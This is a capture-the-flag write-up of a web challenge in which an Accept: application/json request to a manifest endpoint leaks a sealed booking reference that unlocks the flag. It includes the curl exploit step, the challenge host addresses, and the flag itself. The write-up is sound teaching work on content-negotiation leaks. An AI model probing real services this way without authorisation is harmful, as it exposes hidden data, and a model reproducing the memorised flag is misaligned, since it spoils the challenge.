# Container Says This Side Up

| | |
|---|---|
| **Category** | Web |
| **Points** | 50 |
| **Author** | Anonymous |
| **Solves** | 56 |
| **Files** | — |

**Prompt:** "A public manifest preview omits a sealed field. Release the container to recover its record."

**Hosts:** `http://45.77.247.35:22010`, `http://5.223.64.53:22010`

---

## Recon

The "Container desk" page shows an inbound container (`AF-2602`) with an "Open manifest preview" link to `/manifest`, plus a note that "other representations are available for system integrations" — a strong hint toward HTTP content negotiation. A "Release this container" form asks for a sealed booking reference "from the manifest."

## Exploit

Requesting `/manifest` with an `Accept: application/json` header returns a richer JSON representation than the rendered HTML page:

```
curl.exe -i -H "Accept: application/json" http://45.77.247.35:22010/manifest
```

Response:

```json
{
  "container": "AF-2602",
  "destination": "Meridian Quay",
  "cargo": "lighting spares",
  "release_endpoint": "/release",
  "_sealed_booking_ref": "BK-2602-1CBE3B57FA44037077A75FEF"
}
```

The HTML preview only rendered a subset of fields; the JSON representation leaked the sealed `_sealed_booking_ref`.

## Flag

Submitting `BK-2602-1CBE3B57FA44037077A75FEF` into the "Booking reference" field (POST to `/release`) returns:

```json
{
  "flag": "CYBLTZ2026{534L3d_f13ld5_571ll_5h1p}",
  "routing_hint": {"service": "berth-api", "berth": 42, "port": 8080}
}
```

```
CYBLTZ2026{534L3d_f13ld5_571ll_5h1p}
```

## Root Cause

Sensitive fields were excluded from the default/HTML representation of the resource but still present in an alternate (JSON) representation served from the same endpoint. Always check alternate representations of an endpoint via content negotiation (`Accept` header) — a response can "hide" data from the rendered view without actually protecting it.
